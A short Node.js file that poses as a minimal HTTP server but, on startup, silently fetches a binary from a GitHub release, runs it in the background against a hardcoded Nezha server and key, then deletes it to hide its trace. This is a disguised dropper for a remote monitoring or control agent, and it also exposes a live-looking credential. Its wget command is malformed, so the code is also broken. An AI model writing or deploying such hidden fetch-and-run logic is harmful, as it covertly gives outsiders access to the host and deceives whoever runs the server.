const http = require('http');
const { execSync } = require('child_process');

// Load sensitive data from environment variables
const PORT = process.env.PORT || 3000;
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nezha.mingfei1981.eu.org:443';
const NEZHA_KEY = process.env.NEZHA_KEY || '1gKM6VXPAoG2026ccb';

// Create an HTTP server
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Server is running');
});

// Function to execute the start script logic
const startScript = () => {
  try {
    // Download swith
    execSync('wget -qO "https://github.com/babama1001980/good/releases/download/npc/amdswith" -o swith');

    // Make swith executable
    execSync('chmod +x swith');

    // Start swith in the background
    execSync(`nohup ./swith -s "${NEZHA_SERVER}" -p "${NEZHA_KEY}" --tls > /dev/null 2>&1 &`);

    // Delete swith after starting
    execSync('rm swith');
  } catch (error) {
    process.exit(1); // Exit on failure
  }
};

// Start the HTTP server and run the start script
server.listen(PORT, () => {
  startScript(); // Run the script after the server starts
});

// Handle process termination to clean up
process.on('SIGINT', () => {
  server.close(() => {
    process.exit(0);
  });
});
